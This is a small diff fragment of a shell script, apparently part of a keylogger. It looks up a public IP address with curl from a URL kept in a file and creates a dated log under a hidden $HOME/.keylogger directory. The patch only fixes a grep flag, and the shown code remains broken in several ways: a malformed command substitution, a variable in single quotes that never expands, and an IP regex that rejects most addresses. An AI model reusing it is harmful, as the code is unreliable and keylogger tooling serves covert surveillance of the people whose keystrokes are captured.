@@ -59,7 +59,7 @@ if [ -f $IPRAW ];
 	then
 	ipaddr=$(cat $IPRAW)
 else
-	ipaddr=curl $(cat '$IPURLFILE') 2>&1 | grep -o - P '\d+\.\d+\.\d\.\d'
+	ipaddr=curl $(cat '$IPURLFILE') 2>&1 | grep -oP '\d+\.\d+\.\d\.\d'
 fi
 
 touch $HOME/.keylogger/$(date +"%d:%m:%Y.log")
